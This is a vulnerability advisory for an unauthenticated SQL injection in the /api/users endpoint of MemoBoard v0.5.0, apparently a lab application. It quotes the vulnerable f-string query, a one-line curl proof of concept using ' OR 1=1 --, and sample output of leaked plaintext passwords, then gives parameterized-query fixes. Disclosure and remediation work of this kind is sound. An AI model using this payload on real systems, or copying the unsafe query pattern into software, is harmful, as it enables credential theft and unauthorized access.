# Advisory: MemoBoard Unauthenticated SQL Injection in GET /api/users

## Summary

MemoBoard v0.5.0 contains an unauthenticated SQL injection vulnerability in the `GET /api/users` endpoint. The `name` query parameter is directly concatenated into a SQL query via Python f-string interpolation without parameterization or escaping. Because the query's SELECT list includes the `password` column, an attacker can inject `' OR 1=1 --` to dump all users' plaintext passwords, including the administrator account.

## Product

MemoBoard v0.5.0 (Flask-based intranet memo board application)

## Affected Component

- File: `src/board/engine.py`, function `run_user_lookup`, line 71
- Endpoint: `GET /api/users?name=<payload>` (`src/app.py`, lines 63-70)

## Vulnerability Type

CWE-89: Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")

## Severity

High

## Attack Surface

Frontend (unauthenticated) — the `/api/users` endpoint has no authentication check.

## Root Cause

The `run_user_lookup` function constructs its SQL query using f-string interpolation:

```python
sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
```

The `name` parameter originates from `request.args.get("name")` in the `api_users` route, which performs no authentication, validation, or sanitization before passing it to `run_user_lookup`. The query result (including the `password` field) is returned directly to the client via `jsonify`.

## Impact

An unauthenticated attacker can extract all user records from the database, including:
- Plaintext passwords for all users (including admin)
- Email addresses
- User roles

This enables authentication bypass and privilege escalation by using the leaked admin credentials to access restricted functionality.

## Proof of Concept

```bash
curl "http://TARGET:5000/api/users?name=' OR 1=1 --"
```

Response:
```json
{
  "users": [
    {"id": 1, "name": "alice", "role": "user", "email": "alice@memoboard.lab", "password": "alice123"},
    {"id": 2, "name": "bob", "role": "user", "email": "bob@memoboard.lab", "password": "bob123"},
    {"id": 3, "name": "admin", "role": "admin", "email": "admin@memoboard.lab", "password": "admin123"}
  ]
}
```

## Exploit Complexity

Single request — no authentication required, no special conditions needed.

## Defense Status

No effective defense — the endpoint has no authentication, no input validation, and no parameterized query.

## Configuration Premise

Default configuration — the vulnerability exists in the default deployment with no configuration changes required.

## Remediation

1. Use parameterized queries instead of string concatenation:
```python
def run_user_lookup(name: str) -> list[dict]:
    sql = "SELECT id, name, role, email FROM users WHERE name = ?"
    with _connect() as conn:
        rows = conn.execute(sql, (name,)).fetchall()
    return [dict(r) for r in rows]
```
2. Remove the `password` column from the SELECT list — passwords should never be returned in API responses.
3. Add authentication to the `GET /api/users` endpoint.

## References

- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
